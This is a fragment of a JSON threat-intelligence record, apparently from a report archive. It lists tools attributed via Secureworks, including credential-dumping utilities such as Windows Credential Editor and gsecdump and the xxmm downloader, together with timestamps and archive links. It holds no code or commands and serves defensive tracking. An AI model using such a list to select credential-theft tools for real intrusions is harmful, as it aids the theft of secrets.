                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536176,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1653751614,
    "ts_modification_date": 1653751614,
    "files": {
        "pdf": "https://archive.orkl.eu/c10eeccdb53e365b49c2802a4d5e8a40f34b3c7e.pdf",
        "text": "https://archive.orkl.eu/c10eeccdb53e365b49c2802a4d5e8a40f34b3c7e.txt",
        "img": "https://archive.orkl.eu/c10eeccdb53e365b49c2802a4d5e8a40f34b3c7e.jpg"
    }
}